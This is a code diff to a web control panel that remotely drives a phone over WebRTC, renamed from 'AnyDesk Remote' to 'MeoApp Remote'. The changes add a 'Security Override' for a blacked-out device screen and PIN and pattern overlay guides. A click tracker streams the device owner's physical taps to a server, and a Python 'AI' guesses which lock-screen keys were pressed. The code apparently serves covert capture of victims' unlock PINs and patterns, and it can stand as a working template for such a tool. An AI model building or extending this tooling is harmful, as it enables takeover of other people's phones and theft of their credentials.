@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AnyDesk Remote | Control Center</title>
+    <title>MeoApp Remote | Control Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -167,9 +167,26 @@
             border-radius: 20px;
             font-size: 0.8rem;
             display: flex;
+            flex-direction: column; /* Changed to column to stack status and coords */
+            align-items: flex-end;
+            gap: 4px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .status-info {
+            display: flex;
             align-items: center;
             gap: 8px;
-            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .coord-display {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.7rem;
+            color: #00ff88;
+            background: rgba(0,0,0,0.3);
+            padding: 2px 6px;
+            border-radius: 4px;
+            display: none; /* Hidden by default */
         }
 
         .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff4444; }
@@ -180,14 +197,129 @@
             bottom: 30px;
             right: 30px;
             display: flex;
+            flex-direction: column; /* Changed to column to stack panel and log */
+            align-items: flex-end;
             gap: 15px;
             z-index: 10000;
+        }
+
+        .panel-actions {
+            display: flex;
+            flex-direction: row; /* Horizontal layout for buttons */
+            gap: 10px;
             background: rgba(0, 0, 0, 0.7);
             padding: 10px;
             border-radius: 16px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            max-width: 0;
+            overflow: hidden;
+            opacity: 0;
+            white-space: nowrap;
+            padding-left: 0;
+            padding-right: 0;
+            border: none;
         }
+
+        .panel-actions.expanded {
+            max-width: 800px; /* Large enough to hold all buttons */
+            opacity: 1;
+            padding: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .control-panel-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .toggle-panel-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--primary-accent);
+            color: white;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
+            z-index: 10001;
+            transition: transform 0.3s;
+        }
+
+        .toggle-panel-btn.active {
+            transform: rotate(180deg);
+            background: #444;
+        }
+
+        .action-btn.restricted {
+            border-color: #ffaa00;
+            color: #ffaa00;
+        }
+
+        .action-btn.restricted:hover {
+            background: rgba(255, 170, 0, 0.2);
+            color: #ffaa00;
+        }
+
+        .click-log-window {
+            width: 250px;
+            max-height: 200px;
+            background: rgba(26, 26, 26, 0.9);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            display: none; /* Shown only when connected */
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .log-header {
+            padding: 8px 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.75rem;
+            font-weight: bold;
+            color: var(--text-dim);
+        }
+
+        .log-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.75rem;
+        }
+
+        .log-entry {
+            padding: 4px 8px;
+            border-radius: 4px;
+            margin-bottom: 4px;
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 2px solid #00ff88;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .log-entry:nth-child(even) {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .btn-clear-log {
+            cursor: pointer;
+            color: var(--primary-accent);
+            font-size: 0.7rem;
+        }
+        .btn-clear-log:hover { text-decoration: underline; }
 
         .action-btn {
             padding: 10px 20px;
@@ -265,79 +397,115 @@
             to { transform: translateX(400px); left: -50px; }
         }
 
-        /* Simulator Overlays - Higher Visibility */
+        /* Simulator Overlays - Higher Visibility & Movable/Resizable */
         .simulator-overlay {
             position: absolute;
-            inset: 0;
             display: none;
+            flex-direction: column;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            overflow: hidden;
+            min-width: 180px;
+            min-height: 200px;
+            user-select: none;
+            touch-action: none;
+            pointer-events: none;
+        }
+
+        .modal-header {
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            cursor: move;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            font-weight: bold;
+            pointer-events: auto;
+        }
+
+        .resize-handle {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: transparent;
+            bottom: 0;
+            right: 0;
+            cursor: nwse-resize;
+            z-index: 2001;
+            pointer-events: auto;
+        }
+
+        .resize-handle::after {
+            content: '';
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid rgba(255, 255, 255, 0.5);
+            border-bottom: 2px solid rgba(255, 255, 255, 0.5);
+            bottom: 5px;
+            right: 5px;
+        }
+
+        .simulator-content {
+            flex: 1;
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: rgba(0, 0, 0, 0.4); /* Darker background for better contrast */
-            backdrop-filter: blur(3px);
-            z-index: 20;
+            padding: 20px;
+            position: relative;
             pointer-events: none;
         }
 
         .pin-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.08); /* Brighter glass effect */
-            border-radius: 24px;
-            border: 2px solid rgba(255, 255, 255, 0.4); /* Solid, brighter border */
-            box-shadow: 0 0 30px rgba(0,0,0,0.5);
-            pointer-events: none;
-            width: 150px;
-            margin-top: 110px;
+            gap: 10px;
+            width: 100%;
+            height: 100%;
         }
 
         .pin-btn {
-            width: 44px;
-            height: 44px;
+            width: 100%;
+            aspect-ratio: 1;
             border-radius: 50%;
-            border: 2px solid rgba(255, 255, 255, 0.6); /* High visibility white border */
-            background: rgba(0, 0, 0, 0.2);
-            color: #ffffff; /* Bright white text */
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.05);
+            color: #ffffff;
             font-size: 1.2rem;
             font-weight: 700;
             display: flex;
             align-items: center;
             justify-content: center;
             pointer-events: none;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
 
         .pattern-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             grid-template-rows: repeat(3, 1fr);
-            gap: 40px; /* Reduced gap */
-            padding: 30px;
+            gap: 15%;
+            width: 80%;
+            height: 80%;
             position: relative;
             pointer-events: none;
-            width: 220px; /* Reduced width */
-            margin-top: 60px; /* Positioned lower */
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 30px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
         }
 
         .pattern-dot {
-            width: 18px; /* Slightly larger */
-            height: 18px;
-            background: #ffffff; /* Solid white dots for high visibility */
+            width: 12px;
+            height: 12px;
+            background: #ffffff;
             border: 2px solid #00ff88;
             border-radius: 50%;
-            position: relative;
-            z-index: 2;
-            pointer-events: none;
+            justify-self: center;
+            align-self: center;
             box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
-        }
-
-        .pattern-dot.active {
-            background: rgba(0, 255, 136, 0.4);
-            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
         }
 
         /* Click Indicator Animation */
@@ -356,18 +524,6 @@
         @keyframes ripple {
             0% { transform: translate(-50%, -50%) scale(0.2); opacity: 1; }
             100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
-        }
-
-        .pattern-dot.active {
-            background: rgba(0, 255, 136, 0.4);
-            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
-        }
-
-        .pattern-line-canvas {
-            position: absolute;
-            inset: 0;
-            z-index: 1;
-            pointer-events: none;
         }
     </style>
 </head>
@@ -409,57 +565,86 @@
             <video id="remoteVideo" autoplay playsinline></video>
             <canvas id="draw-overlay"></canvas>
 
-            <!-- PIN Simulator (Transparent Guidance) -->
-            <div id="pin-simulator" class="simulator-overlay">
-                <div class="pin-grid">
-                    <div class="pin-btn">1</div>
-                    <div class="pin-btn">2</div>
-                    <div class="pin-btn">3</div>
-                    <div class="pin-btn">4</div>
-                    <div class="pin-btn">5</div>
-                    <div class="pin-btn">6</div>
-                    <div class="pin-btn">7</div>
-                    <div class="pin-btn">8</div>
-                    <div class="pin-btn">9</div>
-                    <div class="pin-btn" style="font-size: 0.8rem; border-color: rgba(255,68,68,0.2);"><i class="fas fa-backspace"></i></div>
-                    <div class="pin-btn">0</div>
-                    <div class="pin-btn" style="font-size: 0.8rem; border-color: rgba(0,255,136,0.2);">OK</div>
+            <!-- Movable PIN Simulator -->
+            <div id="pin-simulator" class="simulator-overlay" style="width: 220px; height: 320px; top: 10%; left: 10%;">
+                <div class="modal-header">
+                    <span><i class="fas fa-th"></i> PIN GUIDE</span>
+                    <i class="fas fa-compress-arrows-alt"></i>
                 </div>
+                <div class="simulator-content">
+                    <div class="pin-grid">
+                        <div class="pin-btn">1</div><div class="pin-btn">2</div><div class="pin-btn">3</div>
+                        <div class="pin-btn">4</div><div class="pin-btn">5</div><div class="pin-btn">6</div>
+                        <div class="pin-btn">7</div><div class="pin-btn">8</div><div class="pin-btn">9</div>
+                        <div class="pin-btn" style="opacity: 0.3;"><i class="fas fa-backspace"></i></div>
+                        <div class="pin-btn">0</div>
+                        <div class="pin-btn" style="opacity: 0.3;">OK</div>
+                    </div>
+                </div>
+                <div class="resize-handle"></div>
             </div>
 
-            <!-- Pattern Simulator (Transparent Guidance) -->
-            <div id="pattern-simulator" class="simulator-overlay">
-                <div class="pattern-grid" id="pattern-grid">
-                    <div class="pattern-dot" data-idx="0"></div>
-                    <div class="pattern-dot" data-idx="1"></div>
-                    <div class="pattern-dot" data-idx="2"></div>
-                    <div class="pattern-dot" data-idx="3"></div>
-                    <div class="pattern-dot" data-idx="4"></div>
-                    <div class="pattern-dot" data-idx="5"></div>
-                    <div class="pattern-dot" data-idx="6"></div>
-                    <div class="pattern-dot" data-idx="7"></div>
-                    <div class="pattern-dot" data-idx="8"></div>
-                    <canvas id="pattern-line-canvas" class="pattern-line-canvas"></canvas>
+            <!-- Movable Pattern Simulator -->
+            <div id="pattern-simulator" class="simulator-overlay" style="width: 250px; height: 250px; top: 10%; right: 10%;">
+                <div class="modal-header">
+                    <span><i class="fas fa-braille"></i> PATTERN GUIDE</span>
+                    <i class="fas fa-compress-arrows-alt"></i>
                 </div>
+                <div class="simulator-content">
+                    <div class="pattern-grid">
+                        <div class="pattern-dot"></div><div class="pattern-dot"></div><div class="pattern-dot"></div>
+                        <div class="pattern-dot"></div><div class="pattern-dot"></div><div class="pattern-dot"></div>
+                        <div class="pattern-dot"></div><div class="pattern-dot"></div><div class="pattern-dot"></div>
+                    </div>
+                </div>
+                <div class="resize-handle"></div>
             </div>
         </div>
 
         <div class="status-badge" style="z-index: 10000;">
-            <div id="status-dot" class="status-dot"></div>
-            <span id="status-text">Ready</span>
+            <div class="status-info">
+                <div id="status-dot" class="status-dot"></div>
+                <span id="status-text">Ready</span>
+            </div>
+            <div id="coord-info" class="coord-display">X: 0, Y: 0</div>
         </div>
 
         <div class="control-panel" id="remote-controls" style="display: none;">
-            <input type="password" id="unlock-pin" class="unlock-input" placeholder="PIN" maxlength="6">
-            <button class="action-btn" id="unlock-toggle" onclick="toggleUnlockInput()">
-                <i class="fas fa-keyboard"></i> PIN
-            </button>
-            <button class="action-btn" id="pattern-toggle" onclick="togglePatternMode()">
-                <i class="fas fa-braille"></i> Pattern Mode
-            </button>
-            <button class="action-btn" id="send-unlock" style="display: none;" onclick="sendUnlock()">
-                Confirm
-            </button>
+            <!-- Click Log Window -->
+            <div class="click-log-window" id="click-log-window" style="display: flex;">
+                <div class="log-header">
+                    <span><i class="fas fa-list-ul"></i> CLICK TRACKER</span>
+                    <span class="btn-clear-log" onclick="clearClickLog()">Clear</span>
+                </div>
+                <div class="log-content" id="click-log-content">
+                    <div style="color: #666; font-style: italic; text-align: center; padding: 10px;">Waiting for taps...</div>
+                </div>
+            </div>
+
+            <!-- Main Actions (Now Collapsible) -->
+            <div class="control-panel-wrapper">
+                <div class="panel-actions" id="main-actions-panel">
+                    <button class="action-btn" id="wake-btn" onclick="wakeDevice()">
+                        <i class="fas fa-sun"></i> Wake
+                    </button>
+                    <button class="action-btn restricted" id="security-mode" onclick="toggleSecurityOverride()" title="Enable when screen is black">
+                        <i class="fas fa-shield-alt"></i> Security Override
+                    </button>
+                    <input type="password" id="unlock-pin" class="unlock-input" placeholder="PIN" maxlength="6">
+                    <button class="action-btn" id="unlock-toggle" onclick="toggleUnlockInput()">
+                        <i class="fas fa-keyboard"></i> PIN
+                    </button>
+                    <button class="action-btn" id="pattern-toggle" onclick="togglePatternMode()">
+                        <i class="fas fa-braille"></i> Pattern Mode
+                    </button>
+                    <button class="action-btn" id="send-unlock" style="display: none;" onclick="sendUnlock()">
+                        Confirm
+                    </button>
+                </div>
+                <button class="toggle-panel-btn" id="panel-toggle" onclick="toggleMainPanel()">
+                    <i class="fas fa-chevron-left"></i>
+                </button>
+            </div>
         </div>
     </main>
 
@@ -476,18 +661,72 @@
         const statusDot = document.getElementById('status-dot');
         const statusText = document.getElementById('status-text');
         const roomIdInput = document.getElementById('roomId');
+
         const pinSimulator = document.getElementById('pin-simulator');
         const patternSimulator = document.getElementById('pattern-simulator');
-        const patternCanvas = document.getElementById('pattern-line-canvas');
-        const patternCtx = patternCanvas.getContext('2d');
-        const patternDots = document.querySelectorAll('.pattern-dot');
+        const unlockInput = document.getElementById('unlock-pin');
+        const confirmBtn = document.getElementById('send-unlock');
 
         let isPatternMode = false;
+        let isPinMode = false;
         let patternPoints = [];
-        let isDrawingPattern = false;
-        let currentPin = "";
 
-        // Load saved Room ID
+        // Make elements draggable and resizable
+        function makeMovable(element) {
+            const header = element.querySelector('.modal-header');
+            const resizer = element.querySelector('.resize-handle');
+
+            let isDragging = false;
+            let isResizing = false;
+            let startX, startY, startWidth, startHeight, startLeft, startTop;
+
+            header.addEventListener('mousedown', (e) => {
+                isDragging = true;
+                startX = e.clientX;
+                startY = e.clientY;
+                startLeft = parseInt(window.getComputedStyle(element).left);
+                startTop = parseInt(window.getComputedStyle(element).top);
+                element.style.zIndex = 3000;
+                document.querySelectorAll('.simulator-overlay').forEach(el => {
+                   if(el !== element) el.style.zIndex = 2000;
+                });
+            });
+
+            resizer.addEventListener('mousedown', (e) => {
+                isResizing = true;
+                startX = e.clientX;
+                startY = e.clientY;
+                startWidth = parseInt(window.getComputedStyle(element).width);
+                startHeight = parseInt(window.getComputedStyle(element).height);
+                e.stopPropagation();
+            });
+
+            window.addEventListener('mousemove', (e) => {
+                if (isDragging) {
+                    const dx = e.clientX - startX;
+                    const dy = e.clientY - startY;
+                    element.style.left = (startLeft + dx) + 'px';
+                    element.style.top = (startTop + dy) + 'px';
+                    element.style.right = 'auto';
+                }
+                if (isResizing) {
+                    const dw = e.clientX - startX;
+                    const dh = e.clientY - startY;
+                    element.style.width = Math.max(150, startWidth + dw) + 'px';
+                    element.style.height = Math.max(150, startHeight + dh) + 'px';
+                }
+            });
+
+            window.addEventListener('mouseup', () => {
+                isDragging = false;
+                isResizing = false;
+            });
+        }
+
+        makeMovable(pinSimulator);
+        makeMovable(patternSimulator);
+
+        // Saved Room ID
         const savedRoomId = localStorage.getItem('lastRoomId');
         if (savedRoomId) roomIdInput.value = savedRoomId;
 
@@ -500,22 +739,80 @@
             }
         }
 
+        function toggleUnlockInput() {
+            isPinMode = !isPinMode;
+            const btn = document.getElementById('unlock-toggle');
+            if (isPinMode) {
+                pinSimulator.style.display = 'flex';
+                unlockInput.style.display = 'block';
+                confirmBtn.style.display = 'block';
+                btn.classList.add('active-mode');
+                btn.innerHTML = '<i class="fas fa-times"></i> Close PIN';
+                wakeDevice(); // Also try to wake when opening PIN
+            } else {
+                pinSimulator.style.display = 'none';
+                unlockInput.style.display = 'none';
+                confirmBtn.style.display = 'none';
+                btn.classList.remove('active-mode');
+                btn.innerHTML = '<i class="fas fa-keyboard"></i> PIN';
+            }
+        }
+
+        function sendUnlock() {
+            const pin = unlockInput.value;
+            if (pin && dataChannel?.readyState === 'open') {
+                dataChannel.send(JSON.stringify({ type: 'unlock', pin: pin }));
+                toggleUnlockInput();
+                unlockInput.value = "";
+            }
+        }
+
         function togglePatternMode() {
             isPatternMode = !isPatternMode;
             const btn = document.getElementById('pattern-toggle');
             if (isPatternMode) {
+                patternSimulator.style.display = 'flex';
                 btn.classList.add('active-mode');
                 btn.innerHTML = '<i class="fas fa-fingerprint"></i> DRAW ON SCREEN';
+
                 drawCanvas.width = remoteVideo.clientWidth;
                 drawCanvas.height = remoteVideo.clientHeight;
                 drawCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height);
-                if (dataChannel?.readyState === 'open') {
-                    dataChannel.send(JSON.stringify({ type: 'swipe', x1: 0.5, y1: 0.8, x2: 0.5, y2: 0.2, duration: 300 }));
-                }
+
+                wakeDevice(); // Also try to wake when opening Pattern
             } else {
+                patternSimulator.style.display = 'none';
                 btn.classList.remove('active-mode');
                 btn.innerHTML = '<i class="fas fa-braille"></i> Pattern Mode';
                 drawCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height);
+            }
+        }
+
+        let isSecurityOverride = false;
+
+        function toggleSecurityOverride() {
+            isSecurityOverride = !isSecurityOverride;
+            const btn = document.getElementById('security-mode');
+            if (isSecurityOverride) {
+                btn.classList.add('active-mode');
+                btn.innerHTML = '<i class="fas fa-eye"></i> OVERRIDE ON';
+                // When override is on, we ensure the video container stays interactive even if stream is blank
+                remoteVideo.style.display = 'block';
+                remoteVideo.style.background = '#111'; // Dark grey instead of total black
+                dinoLoader.style.display = 'none';
+            } else {
+                btn.classList.remove('active-mode');
+                btn.innerHTML = '<i class="fas fa-shield-alt"></i> Security Override';
+                if (!remoteVideo.srcObject) {
+                    remoteVideo.style.display = 'none';
+                    dinoLoader.style.display = 'flex';
+                }
+            }
+        }
+
+        function wakeDevice() {
+            if (dataChannel?.readyState === 'open') {
+                dataChannel.send(JSON.stringify({ type: 'wake' }));
             }
         }
 
@@ -548,14 +845,16 @@
             setTimeout(() => effect.remove(), 500);
         }
 
+        let isMouseDown = false;
+        let startX, startY, startTime;
+
         remoteVideo.addEventListener('mousedown', (e) => {
             if (remoteVideo.style.display === 'none') return;
-
             showClickEffect(e);
-
             isMouseDown = true;
             const coords = getCoords(e);
             startX = coords.x; startY = coords.y; startTime = Date.now();
+
             if (isPatternMode) {
                 patternPoints = [{ x: coords.x, y: coords.y }];
                 drawCtx.beginPath();
@@ -636,6 +935,20 @@
             peerConnection.ondatachannel = (event) => {
                 dataChannel = event.channel;
                 dataChannel.onopen = () => updateStatus("Live Control", true);
+
+                // Handle messages from device
+                dataChannel.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'click_feedback') {
+                            displayCoordinates(data.x, data.y, "Laptop Tap");
+                        } else if (data.type === 'device_click') {
+                            displayCoordinates(data.x, data.y, data.label || "Device Tap");
+                        }
+                    } catch (e) {
+                        console.error("Error parsing data channel message", e);
+                    }
+                };
             };
             peerConnection.ontrack = (event) => {
                 remoteVideo.srcObject = event.streams[0] || new MediaStream([event.track]);
@@ -648,6 +961,78 @@
             peerConnection.onicecandidate = (event) => {
                 if (event.candidate) socket.emit("message", { roomId, candidate: event.candidate });
             };
+        }
+
+        function toggleMainPanel() {
+            const panel = document.getElementById('main-actions-panel');
+            const btn = document.getElementById('panel-toggle');
+            const icon = btn.querySelector('i');
+
+            panel.classList.toggle('expanded');
+            btn.classList.toggle('active');
+
+            if (panel.classList.contains('expanded')) {
+                icon.className = 'fas fa-chevron-right';
+            } else {
+                icon.className = 'fas fa-chevron-left';
+            }
+        }
+
+        let clickCount = 0;
+
+        function displayCoordinates(x, y, source = "Tap") {
+            clickCount++;
+
+            // Send click to server for Python AI tracking
+            if (socket && socket.connected) {
+                const roomId = roomIdInput.value || localStorage.getItem('lastRoomId');
+                socket.emit("device_click", {
+                    roomId: roomId,
+                    x: x,
+                    y: y,
+                    label: source.includes("Device") ? "Physical Touch" : "Laptop Click",
+                    source: source
+                });
+            }
+
+            const logContent = document.getElementById('click-log-content');
+
+            // Remove placeholder if it's the first click
+            if (clickCount === 1) logContent.innerHTML = '';
+
+            const xPct = (x * 100).toFixed(1);
+            const yPct = (y * 100).toFixed(1);
+
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            if (source.includes("Device")) {
+                entry.style.borderLeft = "2px solid #ff4d6d"; // Red for device clicks
+            }
+
+            entry.innerHTML = `
+                <span><b>${getOrdinal(clickCount)}</b> ${source}:</span>
+                <span>${xPct}%, ${yPct}%</span>
+            `;
+
+            logContent.insertBefore(entry, logContent.firstChild);
+
+            // Also update the small badge at the top
+            const coordInfo = document.getElementById('coord-info');
+            coordInfo.innerText = `${source}: ${xPct}%, ${yPct}%`;
+            coordInfo.style.display = 'block';
+        }
+
+        function getOrdinal(n) {
+            const s = ["th", "st", "nd", "rd"],
+                  v = n % 100;
+            return n + (s[(v - 20) % 10] || s[v] || s[0]);
+        }
+
+        function clearClickLog() {
+            clickCount = 0;
+            document.getElementById('click-log-content').innerHTML =
+                '<div style="color: #666; font-style: italic; text-align: center; padding: 10px;">Waiting for taps...</div>';
+            document.getElementById('coord-info').style.display = 'none';
         }
 
         socket.on("message", async (data) => {
@@ -664,68 +1049,24 @@
             }
         });
 
-        function toggleUnlockInput() {
-            const btn = document.getElementById('unlock-toggle');
-            if (pinSimulator.style.display === 'none' || !pinSimulator.style.display) {
-                // Open PIN Guidance Overlay
-                pinSimulator.style.display = 'flex';
-                btn.classList.add('active-mode');
-                btn.innerHTML = '<i class="fas fa-times"></i> Close PIN';
+        // Listen for AI feedback from Python
+        socket.on("ai_key_guess_broadcast", (data) => {
+            const logContent = document.getElementById('click-log-content');
+            // Update the first log entry (the most recent one) if it's a coordinate match
+            const firstEntry = logContent.firstChild;
+            if (firstEntry && firstEntry.innerHTML) {
+                const xStr = (data.x * 100).toFixed(1) + "%";
+                const yStr = (data.y * 100).toFixed(1) + "%";
 
-                // If pattern is open, close it
-                if (isPatternMode) togglePatternMode();
-
-                // Wake up screen/swipe up to show PIN keypad
-                if (dataChannel?.readyState === 'open') {
-                    dataChannel.send(JSON.stringify({ type: 'swipe', x1: 0.5, y1: 0.8, x2: 0.5, y2: 0.2, duration: 300 }));
+                if (firstEntry.innerHTML.includes(xStr) && firstEntry.innerHTML.includes(yStr)) {
+                    // Update with AI Guess
+                    const labelSpan = firstEntry.querySelector('span:first-child');
+                    if (labelSpan) {
+                        labelSpan.innerHTML += ` <span style="color:#ffaa00; font-size:0.65rem;">(AI: ${data.guessed_key})</span>`;
+                    }
                 }
-            } else {
-                // Close PIN Guidance Overlay
-                pinSimulator.style.display = 'none';
-                btn.classList.remove('active-mode');
-                btn.innerHTML = '<i class="fas fa-keyboard"></i> PIN';
             }
-        }
-
-        // Removed older simulation functions as clicks now go directly to the phone
-
-        function sendUnlockPin(pin) {
-            if (dataChannel?.readyState === 'open') {
-                console.log("[SIM] Sending PIN to device:", pin);
-                dataChannel.send(JSON.stringify({ type: 'unlock', pin: pin }));
-            }
-        }
-
-        function togglePatternMode() {
-            isPatternMode = !isPatternMode;
-            const btn = document.getElementById('pattern-toggle');
-            if (isPatternMode) {
-                // Open Pattern Guidance Overlay
-                patternSimulator.style.display = 'flex';
-                btn.classList.add('active-mode');
-                btn.innerHTML = '<i class="fas fa-fingerprint"></i> GUIDE ACTIVE';
-
-                // If PIN is open, close it
-                if (pinSimulator.style.display === 'flex') toggleUnlockInput();
-
-                // Wake up screen/swipe up to show pattern dots
-                if (dataChannel?.readyState === 'open') {
-                    dataChannel.send(JSON.stringify({ type: 'swipe', x1: 0.5, y1: 0.8, x2: 0.5, y2: 0.2, duration: 300 }));
-                }
-            } else {
-                // Close Pattern Guidance Overlay
-                patternSimulator.style.display = 'none';
-                btn.classList.remove('active-mode');
-                btn.innerHTML = '<i class="fas fa-braille"></i> Pattern Mode';
-            }
-        }
-
-        // Removed pattern drawing event handlers (startPattern, movePattern, endPattern)
-        // as interaction now passes through to the standard remote control logic.
-
-        // Original touch/swipe logic still applies to the video background
-        let isMouseDown = false;
-        let startX, startY, startTime;
+        });
     </script>
 </body>
 </html>
